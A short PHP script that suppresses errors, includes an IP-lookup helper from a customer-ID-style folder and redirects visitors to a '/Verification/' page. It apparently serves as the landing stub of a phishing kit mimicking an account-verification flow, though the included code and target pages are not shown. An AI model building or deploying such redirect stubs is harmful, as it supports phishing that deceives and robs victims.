<?php
//LOCATION !
session_start();
error_reporting(0);
include('./customer_center/customer-IDPP00C984/functions/get_ip.php');

$DIR='/Verification/';
header("LOCATION: ".$DIR."");
?>
